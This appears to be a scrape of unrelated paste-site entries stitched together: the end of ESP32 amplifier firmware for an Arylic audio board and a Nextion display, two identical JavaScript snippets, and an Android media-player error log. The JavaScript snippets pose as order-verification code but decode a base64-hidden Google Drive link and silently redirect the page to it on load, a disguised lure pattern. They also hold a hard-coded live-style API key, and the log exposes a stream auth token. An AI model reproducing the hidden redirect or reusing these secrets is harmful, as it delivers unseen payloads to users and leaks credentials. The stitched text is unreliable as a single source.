  Serial.println(compile_date);
  Serial.println(""Arylic_0823"");
  readRTC();
  digitalWrite(pwr, HIGH);
  power.firstInitial();
}

void loop() {  ////////////////////////////////// START OF LOOP


  // while (NextionPage == boot) {
  //   // reading nextion
  //   // powerSW
  //   // IR
  // }

  // while (NextionPage == standby) {
  //   // reading nextion
  //   // powerSW
  //   // IR
  // }

  // while (NextionPage == main) {
  //   // reading nextion
  //   // reading digi
  //   // reading dsp
  //   // check protection
  //   // powerSW
  //   // IR
  // }



  if (NextionPage == main && speaker1timeon == 1 && millis() > speakerMillis) {
    digitalWrite(speaker, HIGH);
    speaker1timeon = 0;
  }

  // if (dcErrorLeft == 0 && dcErrorRight == 0) {
  //   // relays.spk(ON);
  //   relays.spk(ON);
  // }
  //  speaker1timeon = 0;
  // }

  readSignal();

  if (self_test == 0) {
    readProtection();
    senseBrightness();
    senseTemp();
    rotary_loop();

    if (IrReceiver.decode()) {  //////////// IR REMOTE HANDLING
      //  Serial.println(NextionPage);
      //  IrReceiver.printIRResultShort(&Serial);
      //  IrReceiver.printIRSendUsage(&Serial);
      if (IrReceiver.decodedIRData.protocol == UNKNOWN) {
        //  Serial.println(F(""Received noise or an unknown (or not yet enabled) protocol""));  // We have an unknown protocol here, print more inf
        //  IrReceiver.printIRResultRawFormatted(&Serial, true);
      }
      Serial.println();
      IrReceiver.resume();                                                             // Enable receiving of the next value
      if (IrReceiver.decodedIRData.command == 0x45 && (irMillis + 5000) < millis()) {  // Power button && irLastCode != IrReceiver.decodedIRData.command
        if (NextionPage == 2) {                                                        //0
          nextion.click(""powerOff"", 1);
          // tone(23, 1000, 50);
        }
        if (NextionPage == 1) {  //2
          nextion.click(""powerOn"", 1);
          readRTC();
          // tone(23, 1000, 50);
        }
        irMillis = millis();
        Serial.println(""Pressed: POWER"");
      } else if (IrReceiver.decodedIRData.command == 0x19) {  // BT button
        uart.print(""SRC:BT;"");
        Serial.println(""Pressed: BT"");
      } else if (IrReceiver.decodedIRData.command == 0xD) {  // FM button
        //uart.print(""SRC:BT;"");
        Serial.println(""Pressed: FM"");
      } else if (IrReceiver.decodedIRData.command == 0x09 && irVolMillis + 300 < millis()) {  // VolUp
        if (digiVolume < 100) {
          digiVolume = digiVolume + volStep;
          if (digiVolume > 100) digiVolume = 100;
        }
        irVolMillis = millis();
        Serial.println(digiVolume);
        uart.print(""VOL:"" + String(digiVolume) + "";"");
        Serial.println(""Pressed: VOL UP"");
      } else if (IrReceiver.decodedIRData.command == 0x15 && irVolMillis + 300 < millis()) {  // VolDown
        if (digiVolume > 0) {
          digiVolume = digiVolume - volStep;
          if (digiVolume < 0) digiVolume = 0;
        }
        irVolMillis = millis();
        Serial.println(digiVolume);
        uart.print(""VOL:"" + String(digiVolume) + "";"");
        Serial.println(""Pressed: VOL DOWN"");
      } else if (IrReceiver.decodedIRData.command == 0x46 && (irMillis + 5000) < millis()) {  // Input stepping
        if (sourceS < 4) {
          sourceS++;
        } else {
          sourceS = 0;
        }
        String inp[5] = { ""NET"", ""BT"", ""LINE-IN"", ""USBDAC"", ""OPT"" };
        uart.print(""SRC:"" + inp[sourceS] + "";"");
        Serial.println(""SRC:"" + inp[sourceS] + "";"");
        Serial.println(sourceS);
        irMillis = millis();
        Serial.println(""Pressed: MODE (input stepping)"");
      } else if (IrReceiver.decodedIRData.command == 0x7 && (irMillis + 5000) < millis()) {  // Muting
        if (NextionPage == main) {
          uart.print(""MUT:1;"");
        }
        if (NextionPage == main) {
          uart.print(""MUT:0;"");
        }
        irMillis = millis();
        Serial.println(""Pressed: MUTE"");
      } else if (IrReceiver.decodedIRData.command == 0x47) {  // Scan
        // uart.print(""SRC:NET;"");
        Serial.println(""Pressed: SCAN"");
      } else if (IrReceiver.decodedIRData.command == 0x43) {  // >> / Next track, only available in BT/NET/USB mode (*1)
        uart.print(""NXT;"");
        Serial.println(""Pressed: NEXT"");
      } else if (IrReceiver.decodedIRData.command == 0x40) {  // << / Previous track, only available in BT/NET/USB mode (*1)
        uart.print(""PRE;"");
        Serial.println(""Pressed: PREV"");
      } else if (IrReceiver.decodedIRData.command == 0x44) {  // Play/Pause track, only available in BT/NET/USB mode (*1)
        uart.print(""POP;"");
        Serial.println(""Pressed: PLAY/PAUSE"");
      } else if (IrReceiver.decodedIRData.command == 0xC) {  // 1
        uart.print(""PST:1;"");
        // digi.volume=digi.maxVolume-10;
        nextion.txt(""main.preset"", ""Preset 1"");
        Serial.println(""Pressed: BT1"");
      } else if (IrReceiver.decodedIRData.command == 0x18) {  // 2
        uart.print(""PST:2;"");
        nextion.txt(""main.preset"", ""Preset 2"");
        Serial.println(""Pressed: BT2"");
      } else if (IrReceiver.decodedIRData.command == 0x5E) {  // 3
        uart.print(""PST:3;"");
        nextion.txt(""main.preset"", ""Preset 3"");
        Serial.println(""Pressed: BT3"");
      } else if (IrReceiver.decodedIRData.command == 0x8) {  // 4
        uart.print(""PST:4;"");
        nextion.txt(""main.preset"", ""Preset 4"");
        Serial.println(""Pressed: BT4"");
      } else if (IrReceiver.decodedIRData.command == 0x1C) {  // 5
        uart.print(""PST:5;"");
        nextion.txt(""main.preset"", ""Preset 5"");
        Serial.println(""Pressed: BT5"");
      } else if (IrReceiver.decodedIRData.command == 0x5A) {  // 6
        uart.print(""PST:6;"");
        nextion.txt(""main.preset"", ""Preset 6"");
        Serial.println(""Pressed: BT6"");
      } else if (IrReceiver.decodedIRData.command == 0x42) {  // 7
        uart.print(""PST:7;"");
        nextion.txt(""main.preset"", ""Preset 7"");
        Serial.println(""Pressed: BT7"");
      } else if (IrReceiver.decodedIRData.command == 0x52) {  // 8
        uart.print(""PST:8;"");
        nextion.txt(""main.preset"", ""Preset 8"");
        Serial.println(""Pressed: BT8"");
      } else if (IrReceiver.decodedIRData.command == 0x4A) {  // 9
        uart.print(""PST:9;"");
        nextion.txt(""main.preset"", ""Preset 9"");
        Serial.println(""Pressed: BT9"");
      } else if (IrReceiver.decodedIRData.command == 0x16) {  // 0
        uart.print(""PST:10;"");
        nextion.txt(""main.preset"", ""Preset 10"");
        Serial.println(""Pressed: BT0"");
      }
    }

    if (digitalRead(powerSW) == 0 && lastPowerState == 1 && lastPressed + 5000 < millis()) {  //////////// POWER SW HANDLING digitalRead(powerSW) == 0 &&
      if (debug == 1) Serial.println(digitalRead(powerSW));
      if (powerState == 0 && NextionPage == 1) {
        powerState = 1;
        uart.print(""SYS:REBOOT;"");
        Serial.println(""---------- Power ON with button... ----------"");
        // tone(12, 1000, 50);
      } else {
        powerState = 0;
        //if (NextionPage == 2)
        uart.print(""SYS:STANDBY;"");
        Serial.println(""---------- Power OFF with button... ----------"");
        // tone(12, 1000, 50);
        inputLed(4);
      }
      lastPressed = millis();
    }
    lastPowerState = digitalRead(powerSW);  //1

    while (uart.available()) {  //////////// UART HANDLING FOR ARYLIC
      if (NextionPage == boot) nextion.val(""boot.vaArylic"", 1);
      sReceived = uart.readStringUntil('\n');
      sReceived.trim();
      if (debug == 1) Serial.println(""uart:___|----------"" + sReceived);
      if (debug == 1) Serial.println("""");
      if (sReceived.startsWith(""PLA:0"")) {
        nextion.txt(""main.infoText"", ""Szünet/Megállítva"");
      } else if (sReceived.startsWith(""PLA:1"")) {
        nextion.txt(""main.infoText"", ""Lejátszás..."");
      } else if (sReceived.startsWith(""STA:"")) {  //////////// STA HANDLING
        Serial.print(""STA: "");
        Serial.println(stacount);
        stacount++;
        if (initDigi == 1) {
          Serial.println(""STA, InitDigi1"");
          initDigi = 0;  //25.01.10
          nextion.val(""boot.vaArylic"", 1);
        } else if (NextionPage != main) {
          Serial.println(""STA, InitDigi0"");

          //nextion.pageChange(main);
          Serial.println(""Page changed..."");
          speakerMillis = millis() + 5000;
        }
        nextion.vis(""main.infoText"", 0);
        if (debug == 1) Serial.println(""STA received"");
        if (debug == 1) Serial.println(""Before: "" + sReceived);
        nextion.txt(""main.infoText"", """");
        // nextion.vis(""main.title"", 0);
        //  nextion.vis(""main.elapsed"", 0);
        // nextion.vis(""main.vendor"", 0);
        nextion.touchSet(""main.preset"", 0);
        reduce4();

        if (sReceived.startsWith(""NET"")) {  //////////// WIFI
          sourceS = 0;
          inputLed(0);
          meta(1, 1, 1, 1);
          if (debug == 1) Serial.println(""...WIFI..."");
          nextion.txt(""main.input"", ""WiFi"");
        } else if (sReceived.startsWith(""BT"")) {  //////////// BLUETOOTH
          sourceS = 1;
          inputLed(1);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...BLUETOOTH..."");
          nextion.txt(""main.input"", ""Bluetooth"");
        } else if (sReceived.startsWith(""LINE-IN"")) {  //////////// LINE-IN
          sourceS = 2;
          inputLed(2);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...LINE-IN..."");
          nextion.txt(""main.input"", ""Line In"");
        } else if (sReceived.startsWith(""USBDAC"")) {  //////////// USB DAC
          sourceS = 3;
          inputLed(3);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...USB DAC..."");
          nextion.txt(""main.input"", ""USB DAC"");
        } else if (sReceived.startsWith(""OPT"")) {  //////////// USB DAC
          sourceS = 4;
          inputLed(4);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...SPDIF..."");
          nextion.txt(""main.input"", ""SPDIF"");
        }
      } else if (sReceived.startsWith(""SYS:STANDBY"")) {  //////////// POWER OFF HANDLING
        initDigi = 0;                                    //25.01.10

        digitalWrite(pwr, LOW);
        digitalWrite(speaker, LOW);
        //
        nextion.pageChange(standby);
        //
        inputLed(4);
        Serial.println(""POWER OFF!!"");
        // // tone(23, 1000, 50);

      } else if (sReceived.startsWith(""SRC:"")) {  //////////// INPUT SOURCE HANDLING
                                                  // nextion.vis(""main.title"", 0);
                                                  // nextion.vis(""main.elapsed"", 0);
                                                  // nextion.vis(""main.vendor"", 0);
        nextion.touchSet(""main.preset"", 0);
        //nextion.pageChange(main);
        reduce4();

        if (sReceived.startsWith(""NET"")) {  //////////// WIFI
          sourceS = 0;
          inputLed(0);
          meta(1, 1, 1, 1);
          if (debug == 1) Serial.println(""...WIFI..."");
          nextion.txt(""main.input"", ""WiFi"");
        } else if (sReceived.startsWith(""BT"")) {  //////////// BLUETOOTH
          sourceS = 1;
          inputLed(1);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...BLUETOOTH..."");
          nextion.txt(""main.input"", ""Bluetooth"");
        } else if (sReceived.startsWith(""LINE-IN"")) {  //////////// LINE-IN
          sourceS = 2;
          inputLed(2);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...LINE-IN..."");
          nextion.txt(""main.input"", ""Line In"");
        } else if (sReceived.startsWith(""USBDAC"")) {  //////////// USB DAC
          sourceS = 3;
          inputLed(3);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...USB DAC..."");
          nextion.txt(""main.input"", ""USB DAC"");
        } else if (sReceived.startsWith(""OPT"")) {  //////////// USB DAC
          sourceS = 4;
          inputLed(4);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...SPDIF..."");
          nextion.txt(""main.input"", ""SPDIF"");
        }
      } else if (sReceived.startsWith(""VOL:"") && (NextionPage == main)) {  //////////// VOLUME HANDLING
        reduce4();
        int index = sReceived.indexOf(';');
        sReceived = sReceived.substring(0, index);
        if (sReceived == ""100"") {
          nextion.txt(""volText"", ""MAX"");
        } else if (sReceived == ""0"") {
          nextion.txt(""volText"", ""MIN"");
        } else {
          if (debug == 1) Serial.println(""volume:  -|:"" + sReceived);
          digiVolume = sReceived.toInt();
          nextion.txt(""volText"", sReceived);
        }
        nextion.systemVal(""digiVol"", digiVolume);
        rotaryEncoder.setEncoderValue(digiVolume);
      } else if (sReceived.startsWith(""MUT:"")) {  //////////// MUTE HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (debug == 1) Serial.println(""Mute:_____/:|"" + sReceived);
        if (sReceived == ""1"") {
          dmute = 1;
          nextion.txt(""volText"", ""MIN"");
          nextion.systemVal(""digiVol"", 0);
        } else if (sReceived == ""0"") {
          dmute = 0;
          nextion.txt(""volText"", String(digiVolume));
          nextion.systemVal(""digiVol"", digiVolume);
        }

      } else if (sReceived.startsWith(""BTC:"")) {  //////////// BLUETOOTH CONNECTION HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (sReceived == ""1"") {
          //nextion.txt(""main.infoText"", ""CONNECTED"");
          uart.print(""TIT;"");
          inputLed(8);
        } else if (sReceived == ""0"") {
          //nextion.txt(""main.infoText"", ""DISCONNECTED"");
          inputLed(9);
        }
      } else if (sReceived.endsWith(""SYS:ON;"") && (NextionPage == standby)) {  //////////// POWER ON HANDLING //25.01.10
        // tone(23, 2000, 50);
        nextion.txt(""standby.powerOn"", ""STARTING"");
        nextion.setPco(""standby.powerOn"", 34784);
        Serial.println(""arrived SYS:ON...(1)"");
        digitalWrite(pwr, HIGH);
        nextion.pageChange(main);
        // if (NextionPage == main) {
        // digitalWrite(speaker, HIGH);
        // }

        speaker1timeon = 1;
      } else if (sReceived.startsWith(""NET:"")) {  //////////// NETWORK CONNECTION HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (sReceived == ""1"") {
          //nextion.txt(""main.infoText"", ""CONNECTED"");
          inputLed(6);
          uart.print(""TIT;"");
          nextion.touchSet(""main.preset"", 1);
          //inputLed(0);
        } else if (sReceived == ""0"") {
          //nextion.txt(""main.infoText"", ""DISCONNECTED"");
          nextion.touchSet(""main.preset"", 0);
          inputLed(7);
        }
      } else if (sReceived.startsWith(""TIT:"") && (NextionPage == main)) {  //////////// Title
        reduce4();
        if (debug == 1) Serial.println(""Title: "" + sReceived);
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        nextion.txt(""main.title"", sReceived);
      } else if (sReceived.startsWith(""ART:"") && (NextionPage == main)) {  //////////// Artist
        reduce4();
        if (debug == 1) Serial.println(""Artist: "" + sReceived);
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        nextion.txt(""main.artist"", sReceived);
      } else if (sReceived.startsWith(""ELP:"")) {  //////////// Elapsed playing time
        reduce4();
        int index = sReceived.indexOf(""/"");
        sReceived = sReceived.substring(0, index);
        // Serial1.println(sReceived);
        long time = sReceived.toInt();
        time = time / 100;
        int tenth = time % 10;
        time = time / 10;
        long hour = time / 3600;
        time = time - (hour * 3600);
        long min = time / 60;
        long sec = time - (min * 60);
        String timeS = ""Time: "";
        if (hour < 10) timeS += ""0"";
        timeS += String(hour) + "":"";
        if (min < 10) timeS += ""0"";
        timeS += String(min) + "":"";
        if (sec < 10) timeS += ""0"";
        timeS += String(sec);  // + ""."" + String(tenth);
        if (time > 0) nextion.txt(""main.elapsed"", timeS);

      } else if (sReceived.startsWith(""BAS:"")) {  //////////// BASS
        reduce4();
        int bass = sReceived.toInt();
        nextion.val(""digiSetup.nbass"", bass);
        if (bass < 0) {
          bass = 11 - abs(bass);
        } else {
          bass = bass + 11;
        }
        nextion.val(""digiSetup.hbass"", bass);

      } else if (sReceived.startsWith(""TRE:"")) {  //////////// TREBLE
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        int treb = sReceived.toInt();
        nextion.val(""digiSetup.ntreb"", treb);
        if (treb < 0) {
          treb = 11 - abs(treb);
        } else {
          treb = treb + 11;
        }
        nextion.val(""digiSetup.htreb"", treb);

      } else if (sReceived.startsWith(""WSS:"") && (NextionPage == digiSetup)) {  //////////// WIFI SIGNAL STRENGTH
        reduce4();
        int signalWifi = sReceived.toInt();
        Serial.println(""WiFi signal strength: "" + sReceived);
        nextion.val(""digiSetup.nWifi"", signalWifi);

      } else if (sReceived.startsWith(""BSS:"") && (NextionPage == digiSetup)) {  //////////// BLUETOOTH SIGNAL STRENGTH
        reduce4();
        int signalBT = sReceived.toInt();
        Serial.println(""Bluetooth signal strength: "" + sReceived);
        nextion.val(""digiSetup.nBt"", signalBT);

      } else if (sReceived.startsWith(""MXV:"")) {  //////////// Max volume, %
        reduce4();
        int volMax = sReceived.toInt();
        nextion.val(""digiSetup.nVolMax"", volMax);
        nextion.val(""digiSetup.hVolMax"", volMax);
        if (debug == 2) Serial.println(volMax);

      } else if (sReceived.startsWith(""VBS:"")) {  //////////// Virtual Bass ON/OFF
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (sReceived == ""1"") {
          nextion.val(""digiSetup.vbs"", 1);
          if (debug == 2) Serial.println(""VBS: on"");
        } else {
          nextion.val(""digiSetup.vbs"", 0);
          if (debug == 2) Serial.println(""VBS: off"");
        }
      } else if (sReceived.startsWith(""PMT:"")) {  //////////// Promt Voice ON/OFF
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (sReceived == ""1"") {
          nextion.val(""digiSetup.pmt"", 1);
          if (debug == 2) Serial.println(""PMT: on"");
        } else {
          nextion.val(""digiSetup.pmt"", 0);
          if (debug == 2) Serial.println(""PMT: off"");
        }

      } else if (sReceived.startsWith(""NAM:"")) {  //////////// Device name
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        String dname, Nname;
        int h = 16, sz = 0, dsz = 0;
        if (sReceived.length() > 0) {
          for (int i = 0; i <= sReceived.length() - 1; i = i + 1) {
            dname = sReceived.substring(i, i + 1);
            if (dname.toInt() >= 0 && dname.toInt() <= 9) {
              sz = dname.toInt();
              // if (debug) Serial.println(dname);
            }
            if (dname == ""A"") sz = 10;
            if (dname == ""B"") sz = 11;
            if (dname == ""C"") sz = 12;
            if (dname == ""D"") sz = 13;
            if (dname == ""E"") sz = 14;
            if (dname == ""F"") sz = 15;
            // sz += sz * h;
            if (h == 0) {
              dsz += sz;
              // if (debug) Serial.printf(""%i. sz=%i\n"", i, dsz);
              Nname += char(dsz);
              dsz = 0;
            } else {
              dsz = sz * 16;
            }
            h = 16 - h;
          }
          if (debug == 1) Serial.println(Nname);
          nextion.txt(""main.NAME"", Nname);
        }
      } else if (sReceived.startsWith(""IPA:"")) {  //////////// Device IP address for connecting to browser's control panel, psw:admin
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);  //removing "";""
        nextion.txt(""digiSetup.digiIP"", sReceived);
      } else if (sReceived.startsWith(""VND:"")) {  //////////// Vendor - Tidal, Spotify, etc...
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);  //removing "";""
        nextion.txt(""main.vaVendor"", sReceived);
      } else if (sReceived.startsWith(""PST:"")) {  //////////// Preset, not response, only command (1-10)
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (debug == 1) Serial.println("";;;;;;;;;; "" + sReceived);
      } else if (sReceived.startsWith(""VST:"")) {
        reduce4();
        String nTemp = sReceived.substring(4);  //////////// VST HANDLING
        volStep = sReceived.toInt();
        nextion.val(""digiSetup.nVolStep"", volStep);
        nextion.val(""digiSetup.hVolStep"", volStep);
        Serial.println(""VST: "" + sReceived);
      }
      sReceived = """";
    }
    while (Serial1.available()) {  //////////// UART HANDLING FOR NEXTION
      nReceived = Serial1.readStringUntil(';');
      // Serial.println(nReceived);
      if (nReceived.startsWith(""NPG:"")) {  //////////// NEXTION PAGE NUMBER
        reduce4n();
        // nReceived = nReceived.substring(4);
        Serial.println(nReceived + ""  "");
        Serial.print(""Nextion PageChange to: "");
        Serial.println(nReceived.toInt());
        NextionPage = nReceived.toInt();
        toDigi = 0;
      }
      if (nReceived == ""SYS:STANDBY"") {  //////////// STANDBY COMMAND
        Serial.println(""StandBy for the Nextion..."");
        digitalWrite(pwr, LOW);
        digitalWrite(speaker, LOW);
        //delay(powerOffDelayForRelay);
        inputLed(4);
        // tone(23, 1000, 50);
        powerState = 0;
      }
      if (nReceived == ""LDR:0"") {  //////////// LDR OFF
        toDigi = 0;
        if (debug == 2) Serial.println(""LDR OFF"");
      }
      if (nReceived == ""LDR:1"") {  //////////// LDR ON
        toDigi = 0;
        if (debug == 2) Serial.println(""LDR ON"");
      }
      if (nReceived == ""ESP:RESTART"") {  //////////// FULL RESTART
        ESP.restart();
      }
      if (nReceived == ""ESP:SPKON"") {  ////////////  SPEAKER RESTART
        digitalWrite(speaker, HIGH);
        nextion.systemVal(""warning"", 0);
        nextion.vis(""ampSetup.resetSPK"", 0);
      }
      if (debug == 1) Serial.println(""++++++++++Serial1:__|"" + nReceived + "";"");
      if (toDigi == 1) uart.print(nReceived + "";"");
      toDigi = 1;
    }
    if (NextionPage == 0) powerState = 1;
  } else {
    readProtection();
    while (uart.available()) {  //////////// UART HANDLING FOR ARYLIC

      sReceived = uart.readStringUntil('\n');
      sReceived.trim();
      //reduce4();
      Serial.println(sReceived);

      Serial.println(""bakkfitty"");
      if (sReceived.startsWith(""STA:"")) {
        nextion.val(""boot.vaArylic"", 1);
        Serial.println(""-----------------------------------------------------------------------------------"");
        if (acError == 0 && dcErrorRight == 0 && dcErrorLeft == 0) {  //AC ERROR =0
          self_test = 0;
          //delay(5000);
          Serial.printf(""Selftest %d\n"", self_test);
        }
        // initDigi = 1;
        //uart.print(""SYS:REBOOT;"");
        // digitalWrite(pwr, HIGH);
        // Serial.println(""PSU is ON!"");
      }
    }
    sReceived = """";
  }
}  //////////////////// End of Loop  ////////////////////
void reduce4() {
  sReceived = sReceived.substring(4);
}
"
289S9UeT,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 08:31:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
De8WugbM,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 08:16:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81878/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NJvMcR1S,2025-04-10T18:13:37.187688,powerampache,PHP,Thursday 10th of April 2025 08:13:38 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 416
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)
Caused by: androidx.media3.datasource.DataSourceException
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:399)
	... 7 more

onPlayerError Invalid response code 416 - Requested Range Not Satisfiable - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 416 - Requested Range Not Satisfiable
 {""headerFields"":{""null"":[""HTTP/1.1 416 Requested Range Not Satisfiable""],""Connection"":[""keep-alive""],""Content-Type"":[""text/html; charset\u003diso-8859-1""],""Date"":[""Thu, 10 Apr 2025 13:11:54 GMT""],""Server"":[""nginx""],""Transfer-Encoding"":[""chunked""],""X-Android-Received-Millis"":[""1744290714659""],""X-Android-Response-Source"":[""NETWORK 416""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744290714329""],""X-Frame-Options"":[""SAMEORIGIN""]},""responseBody"":[60,33,68,79,67,84,89,80,69,32,72,84,77,76,32,80,85,66,76,73,67,32,34,45,47,47,73,69,84,70,47,47,68,84,68,32,72,84,77,76,32,50,46,48,47,47,69,78,34,62,10,60,104,116,109,108,62,60,104,101,97,100,62,10,60,116,105,116,108,101,62,52,49,54,32,82,101,113,117,101,115,116,101,100,32,82,97,110,103,101,32,78,111,116,32,83,97,116,105,115,102,105,97,98,108,101,60,47,116,105,116,108,101,62,10,60,47,104,101,97,100,62,60,98,111,100,121,62,10,60,104,49,62,82,101,113,117,101,115,116,101,100,32,82,97,110,103,101,32,78,111,116,32,83,97,116,105,115,102,105,97,98,108,101,60,47,104,49,62,10,60,112,62,78,111,110,101,32,111,102,32,116,104,101,32,114,97,110,103,101,45,115,112,101,99,105,102,105,101,114,32,118,97,108,117,101,115,32,105,110,32,116,104,101,32,82,97,110,103,101,10,114,101,113,117,101,115,116,45,104,101,97,100,101,114,32,102,105,101,108,100,32,111,118,101,114,108,97,112,32,116,104,101,32,99,117,114,114,101,110,116,32,101,120,116,101,110,116,10,111,102,32,116,104,101,32,115,101,108,101,99,116,101,100,32,114,101,115,111,117,114,99,101,46,60,47,112,62,10,60,104,114,62,10,60,97,100,100,114,101,115,115,62,65,112,97,99,104,101,47,50,46,52,46,54,50,32,40,68,101,98,105,97,110,41,32,83,101,114,118,101,114,32,97,116,32,109,117,115,105,99,46,108,121,103,104,116,101,114,115,46,114,117,32,80,111,114,116,32,56,48,60,47,97,100,100,114,101,115,115,62,10,60,47,98,111,100,121,62,60,47,104,116,109,108,62,10],""responseCode"":416,""responseMessage"":""Requested Range Not Satisfiable"",""dataSpec"":{""absoluteStreamPosition"":8032256,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":8032256,""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d26ea49e96c8c5f88a862584ba5d727c6\u0026type\u003dsong\u0026id\u003d7151"",""host"":""NOT CACHED"",""port"":-2},""uriPositionOffset"":0},""type"":1,""reason"":2004,""cause"":{""reason"":2008,""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":399,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Response code: 